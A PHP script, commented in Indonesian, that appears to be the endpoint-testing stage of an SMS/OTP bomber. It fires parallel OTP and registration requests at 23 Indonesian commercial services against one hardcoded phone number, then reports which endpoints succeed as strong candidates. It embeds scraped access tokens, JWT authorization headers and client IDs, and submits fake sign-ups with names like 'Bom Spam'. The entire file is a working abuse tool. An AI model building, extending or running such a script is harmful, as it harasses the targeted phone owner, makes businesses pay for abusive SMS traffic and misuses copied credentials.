<?php
// Probe ronde 4: 23 endpoint kandidat, format disalin persis dari source tool lain
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$P = '6283822461998'; $L = '083822461998'; $N = '83822461998';

$EPS = [
  ['misteraladin', 'POST', 'https://m.misteraladin.com/api/members/v2/otp/request',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'x-platform: mobile-web',
    'Origin: https://m.misteraladin.com', 'Referer: https://m.misteraladin.com/account'],
   '{"phone_number_country_code":"62","phone_number":"'.$N.'","type":"register"}'],

  ['oyo', 'POST', 'https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id',
   ['Content-Type: application/json', 'Accept: */*', 'consumer_host: https://www.oyorooms.com',
    'access_token: SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=',
    'Origin: https://www.oyorooms.com', 'Referer: https://www.oyorooms.com/login'],
   '{"phone":"'.$N.'","country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"}'],

  ['pizzahut', 'POST', 'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
   ['Content-Type: application/json;charset=UTF-8', 'Accept: application/json', 'x-device-type: PC',
    'x-platform: WEBMOBILE', 'x-channel: 2', 'x-client-id: b39773b0-435b-4f41-80e9-163eef20e0ab',
    'x-lang: en', 'x-device-id: web', 'Origin: https://www.pizzahut.co.id', 'Referer: https://www.pizzahut.co.id/'],
   '{"email":"bom'.random_int(1000,9999).'@gmail.com","first_name":"Bom","last_name":"Spam","password":"Bom++123","phone":"'.$L.'","birthday":"2000-01-02"}'],

  ['maucash', 'GET', 'https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile='.$N.'&channelType=0',
   ['Accept: application/json, text/plain, */*', 'x-origin: google play', 'x-org-id: 1',
    'x-product-code: YN-MAUCASH', 'x-app-version: 2.4.23', 'x-source-id: android'], ''],

  ['danacita', 'GET', 'https://api.danacita.co.id/users/send_otp/?mobile_phone='.$N, [], ''],

  ['carsome', 'POST', 'https://www.carsome.id/website/login/sendSMS',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'x-language: id',
    'country: ID', 'Origin: https://www.carsome.id', 'Referer: https://www.carsome.id/'],
   '{"username":"'.$L.'","optType":1}'],

  ['dekoruma', 'POST', 'https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json',
   ['Content-Type: application/json', 'Accept: */*', 'Origin: https://m.dekoruma.com', 'Referer: https://m.dekoruma.com/'],
   '{"phoneNumber":"+62'.$N.'","platform":"wa"}'],

  ['blibli', 'POST', 'https://www.blibli.com/backend/common/users/_request-otp',
   ['Content-Type: application/json;charset=UTF-8', 'Accept: application/json, text/plain, */*',
    'Origin: https://www.blibli.com', 'Referer: https://www.blibli.com/login?ref=&logonId=0'.$L],
   '{"username":"'.$L.'"}'],

  ['halodoc', 'POST', 'https://www.halodoc.com/api/v1/users/authentication/otp/requests',
   ['Content-Type: application/json', 'Accept: application/json, text/plain, */*', 'save-data: on',
    'x-xsrf-token: 9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89',
    'Origin: https://www.halodoc.com'],
   '{"phone_number":"+62'.$N.'","channel":"sms"}'],

  ['indihome', 'POST', 'https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp',
   ['Content-Type: application/x-www-form-urlencoded'], 'type=hp&msisdn='.$N],

  ['ginee', 'POST', 'https://accounts.ginee.com/api/iam-service/account/send-verification-code',
   ['Content-Type: application/json;charset=UTF-8', 'Accept: application/json, text/plain, */*',
    'Origin: https://accounts.ginee.com', 'Referer: https://accounts.ginee.com/accounts/registered'],
   '{"account":"'.$L.'","countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"}'],

  ['kredinesia', 'POST', 'https://api.kredinesia.id/v1/login/verificationCode',
   ['Content-Type: application/json;charset=UTF-8', 'Accept: application/json, text/plain, */*',
    'Origin: https://www.kredinesia.id', 'Referer: https://www.kredinesia.id/'],
   '{"phone":"'.$L.'","captcha":""}'],

  ['kredito', 'POST', 'https://app-api.kredito.id/client/v1/common/verify-code/send',
   ['Content-Type: application/json; charset=UTF-8', 'Accept-Language: id-ID', 'LPR-TIMESTAMP: 1603281035821',
    'LPR-BRAND: Kredito', 'LPR-PLATFORM: android', 'LPR-SIGNATURE: e15dbea8602409df32a2ed5a123dc244',
    'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks'],
   '{"event":"default_verification","mobilePhone":"'.$N.'","sender":"jatissms"}'],

  ['adakami', 'POST', 'https://api.adakami.id/adaKredit/pesan/kodeVerifikasi',
   ['Content-Type: application/json; charset=UTF-8', 'accept-encoding: gzip', 'x-ada-appid: 800006',
    'x-ada-os: android', 'x-ada-channel: default', 'x-ada-role: 1', 'x-ada-appversion: 1.7.0'],
   '{"ketik":0,"nomor":"'.$L.'"}'],

  ['tokomanamana', 'POST', 'https://tokomanamana.com/ma/auth/request_token_merchant/',
   ['Content-Type: application/x-www-form-urlencoded; charset=UTF-8', 'Accept: */*',
    'X-Requested-With: XMLHttpRequest', 'Origin: https://tokomanamana.com', 'Referer: https://tokomanamana.com/ma/register'],
   'phone='.$L],

  ['trimegah', 'POST', 'https://sbn.trimegah.id/agent/register/sendOtp',
   ['Content-Type: application/x-www-form-urlencoded'], 'noHp='.$L.'&email=bom'.random_int(1000,9999).'@zx.id'],

  ['tri', 'POST', 'https://registrasi.tri.co.id/daftar/generateOTP?',
   ['Content-Type: application/x-www-form-urlencoded'], 'msisdn='.$L],

  ['harnic', 'POST', 'https://harnic.id/login/phone_auth_OTP',
   ['Content-Type: application/x-www-form-urlencoded'], 'phone='.$L],

  ['metroindonesia', 'POST', 'http://access.metroindonesia.com/Member/sendpin',
   ['Content-Type: application/x-www-form-urlencoded'], 'phoneno='.$L],

  ['ruparupa', 'POST', 'https://wapi.ruparupa.com/auth/generate-otp',
   ['Content-Type: application/json', 'Accept: application/json', 'x-company-name: odi',
    'user-platform: mobile', 'x-frontend-type: mobile',
    'authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs',
    'Origin: https://m.ruparupa.com', 'Referer: https://m.ruparupa.com/verification?page=otp-choices'],
   '{"phone":"'.$L.'","action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0}'],

  ['jagreward', 'GET', 'https://id.jagreward.com/member/verify-mobile/'.$N.'/',
   ['Accept: application/json, text/plain, */*', 'X-Requested-With: XMLHttpRequest',
    'Origin: https://id.jagreward.com', 'Referer: https://id.jagreward.com/member/register/'], ''],

  ['seekmi', 'POST', 'https://seekmi.com/ajax/send-otp',
   ['Content-Type: application/x-www-form-urlencoded', 'Accept: text/html, */*; q=0.01',
    'X-Requested-With: XMLHttpRequest', 'Origin: https://seekmi.com', 'Referer: https://seekmi.com/register'],
   'phone='.$L.'&name=BomSpam'],

  ['gokwik-FIX3', 'POST', 'https://gkx.gokwik.co/v4/auth/otp/login/trigger',
   ['Content-Type: application/json', 'Accept: application/json', 'gk-merchant-id: 101', 'gk-source: core',
    'gk-request-id: req'.random_int(100000,999999), 'Origin: https://pdp.gokwik.co', 'Referer: https://pdp.gokwik.co/'],
   '{"phone":"'.$N.'","country":"ID"}'],
];

$mh = curl_multi_init();
$cs = [];
foreach ($EPS as $i => $e) {
  $ch = curl_init();
  $hdrs = $e[3]; $hdrs[] = 'User-Agent: ' . $UA; $hdrs[] = 'Accept-Language: id';
  curl_setopt_array($ch, [CURLOPT_URL => $e[2], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 8, CURLOPT_TIMEOUT => 25, CURLOPT_FOLLOWLOCATION => true, CURLOPT_CUSTOMREQUEST => $e[1]]);
  if ($e[1] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $e[4]);
  curl_multi_add_handle($mh, $ch);
  $cs[$i] = $ch;
}
$running = null; $errs = [];
do {
  curl_multi_exec($mh, $running);
  while (($info = curl_multi_info_read($mh)) !== false) {
    $idx = array_search($info['handle'], $cs, true);
    if ($info['result'] !== CURLE_OK) $errs[$idx] = curl_strerror($info['result']);
  }
  curl_multi_select($mh, 1.0);
} while ($running > 0);

$ok = [];
printf("%-17s %-5s %s\n", 'ENDPOINT', 'HTTP', 'CATATAN');
echo str_repeat('-', 96) . "\n";
foreach ($EPS as $i => $e) {
  $ch = $cs[$i];
  $body = (string) curl_multi_getcontent($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  if (isset($errs[$i])) { $note = 'GAGAL: ' . $errs[$i]; }
  else {
    $cf = (stripos($body, 'Just a moment') !== false) ? ' [CF]' : '';
    $flat = trim(preg_replace('/\s+/', ' ', $body));
    if (stripos($flat, '<!doctype') === 0 || stripos($flat, '<html') === 0) $flat = '(html) ' . substr($flat, 0, 60);
    $note = ('HTTP ' . ($code ?: 0) . $cf . ': ' . ($flat !== '' ? substr($flat, 0, 150) : '(body kosong)'));
    if ($code >= 200 && $code < 300 && stripos($flat, 'error') === false) $ok[] = $e[0];
  }
  printf("%-17s %-5s %s\n", $e[0], $code ?: '000', $note);
  curl_multi_remove_handle($mh, $ch);
}
curl_multi_close($mh);
echo "\nKANDIDAT KUAT: " . implode(', ', $ok) . "\n";
